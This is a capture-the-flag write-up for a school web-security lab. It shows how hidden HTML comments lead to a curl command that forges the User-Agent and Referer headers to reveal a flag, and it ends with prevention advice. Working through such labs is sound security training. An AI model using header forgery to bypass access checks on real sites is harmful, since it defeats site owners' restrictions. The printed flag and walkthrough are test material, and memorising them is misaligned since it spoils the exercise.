# Header spoofing
- a method that involves modifying HTTP request headers to mimic different browsers or refer from a specific webpage
- attackers can disguise their requests to appear as though they come from legitimate sources, potentially bypassing restrictions or triggering specific server responses
- https://medium.com/winkhosting/http-traffic-redirection-based-on-user-agent-header-8c18dc43b184

<b>keywords</b>: spoof (curl)<br>
<b>attacked site</b>: http://borntosec.42/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f

## Exploit
In the footer of the main page, we find a link to a different page:
```
http://borntosec.42/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```
Upon inspecting the page source code, we see several comments:
``` html
<!--
Voila un peu de lecture :

Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
-->

<!-- 
Fun right ?
source: loem.
Good bye  !!!!
-->

<!--
You must come from : "https://www.nsa.gov/".
-->

<!--
Where does it come from?
Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old. Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure Latin words, consectetur, from a Lorem Ipsum passage, and going through the cites of the word in classical literature, discovered the undoubtable source. Lorem Ipsum comes from sections 1.10.32 and 1.10.33 of "de Finibus Bonorum et Malorum" (The Extremes of Good and Evil) by Cicero, written in 45 BC. This book is a treatise on the theory of ethics, very popular during the Renaissance. The first line of Lorem Ipsum, "Lorem ipsum dolor sit amet..", comes from a line in section 1.10.32.

The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from "de Finibus Bonorum et Malorum" by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.
-->

<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```
The comments indicate that we need to:
- use a specific browser, which apparently does not exist (ft_bornToSec)
- arrive from a different site (https://www.nsa.gov/)

We can achieve this by using <code>cURL</code> with the <code>--user-agent</code> (browser) and <code>--referer</code> (base site) options. The exploit involves accessing the page with the required flags:
``` shell
└─$ curl http://borntosec.42/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f --user-agent "ft_bornToSec" --referer "https://www.nsa.gov/" | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6041    0  6041    0     0  1527k      0 -<center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
-:--:-- --:--:-- --:--:-- 1966k
```
The flag is successfully revealed:
```
The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```
## Flag
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Exploit prevention
- validate and sanitize incoming headers
- verify the origin of requests on the server
- maintain session logs and monitor unexpected header changes
